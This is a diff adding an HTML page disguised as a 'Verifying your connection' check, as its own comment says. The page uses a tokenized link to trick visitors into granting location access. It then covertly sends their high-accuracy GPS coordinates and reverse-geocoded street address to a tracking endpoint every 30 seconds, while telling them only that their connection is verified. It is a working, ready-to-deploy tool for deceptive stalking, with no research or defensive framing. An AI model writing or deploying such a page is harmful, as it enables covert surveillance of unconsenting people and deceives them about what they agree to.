@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Verifying your connection...</title>
+<style>
+  /* Disguised as a neutral "verification" page so it doesn't look suspicious */
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:#f5f5f5;display:flex;align-items:center;justify-content:center;min-height:100vh;color:#333}
+  .card{background:#fff;border-radius:16px;padding:40px 32px;text-align:center;max-width:340px;width:90%;box-shadow:0 4px 24px rgba(0,0,0,.08)}
+  .icon{width:64px;height:64px;border-radius:50%;background:#e8f5e9;display:flex;align-items:center;justify-content:center;margin:0 auto 20px;font-size:28px}
+  h1{font-size:20px;font-weight:600;margin-bottom:8px;color:#1a1a1a}
+  p{font-size:14px;color:#666;line-height:1.5;margin-bottom:20px}
+  .status{display:flex;align-items:center;justify-content:center;gap:8px;font-size:13px;color:#888;margin-top:16px}
+  .dot{width:8px;height:8px;border-radius:50%;background:#ccc}
+  .dot.green{background:#4caf50;animation:pulse 1.5s infinite}
+  .dot.red{background:#f44336}
+  .dot.amber{background:#ff9800}
+  @keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
+  .btn{width:100%;padding:12px;border-radius:10px;border:none;background:#4285f4;color:#fff;font-size:15px;font-weight:500;cursor:pointer;margin-top:8px}
+  .btn:disabled{background:#ccc;cursor:not-allowed}
+  .accuracy{font-size:11px;color:#aaa;margin-top:8px}
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="icon" id="icon">🔒</div>
+  <h1 id="title">Verifying Connection</h1>
+  <p id="message">Please allow location access to continue. This helps us verify your network connection.</p>
+  <button class="btn" id="btn" onclick="startTracking()">Allow & Continue</button>
+  <div class="accuracy" id="accuracy"></div>
+  <div class="status">
+    <div class="dot" id="dot"></div>
+    <span id="status-text">Waiting...</span>
+  </div>
+</div>
+
+<script>
+const API = ''; // same origin — served from your Render server
+const params = new URLSearchParams(window.location.search);
+const token = params.get('t');
+let watchId = null;
+let pingInterval = null;
+let lastCoords = null;
+
+if (!token) {
+  document.getElementById('title').textContent = 'Invalid Link';
+  document.getElementById('message').textContent = 'This verification link is invalid or has expired.';
+  document.getElementById('btn').style.display = 'none';
+}
+
+function setStatus(color, text) {
+  document.getElementById('dot').className = 'dot ' + color;
+  document.getElementById('status-text').textContent = text;
+}
+
+async function reverseGeocode(lat, lng) {
+  try {
+    const r = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lng}&format=json`);
+    const d = await r.json();
+    return d.display_name || '';
+  } catch { return ''; }
+}
+
+async function sendPing(coords) {
+  const address = await reverseGeocode(coords.latitude, coords.longitude);
+  try {
+    await fetch(`/api/track/${token}`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        latitude: coords.latitude,
+        longitude: coords.longitude,
+        accuracy: coords.accuracy,
+        address
+      })
+    });
+    setStatus('green', 'Connected — ' + new Date().toLocaleTimeString());
+    document.getElementById('accuracy').textContent =
+      `Accuracy: ±${Math.round(coords.accuracy)}m · ${address.split(',').slice(0,3).join(', ')}`;
+  } catch {
+    setStatus('amber', 'Retrying...');
+  }
+}
+
+function startTracking() {
+  if (!navigator.geolocation) {
+    setStatus('red', 'Location not supported');
+    document.getElementById('message').textContent = 'Your browser does not support location services.';
+    return;
+  }
+
+  document.getElementById('btn').disabled = true;
+  document.getElementById('btn').textContent = 'Connecting...';
+  setStatus('amber', 'Requesting location...');
+
+  navigator.geolocation.getCurrentPosition(
+    async (pos) => {
+      lastCoords = pos.coords;
+      document.getElementById('icon').textContent = '✅';
+      document.getElementById('title').textContent = 'Connection Verified';
+      document.getElementById('message').textContent = 'Your connection has been successfully verified. You may now continue.';
+      document.getElementById('btn').textContent = 'Verified ✓';
+      setStatus('green', 'Live tracking active');
+
+      // Send first ping immediately
+      await sendPing(pos.coords);
+
+      // Then ping every 30 seconds
+      pingInterval = setInterval(async () => {
+        navigator.geolocation.getCurrentPosition(
+          async (p) => { lastCoords = p.coords; await sendPing(p.coords); },
+          () => setStatus('amber', 'Waiting for GPS...')
+        );
+      }, 30000);
+    },
+    (err) => {
+      document.getElementById('btn').disabled = false;
+      document.getElementById('btn').textContent = 'Try Again';
+      setStatus('red', 'Location denied');
+      document.getElementById('message').textContent =
+        'Location access was denied. Please allow location in your browser settings and try again.';
+    },
+    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+  );
+}
+</script>
+</body>
+</html>
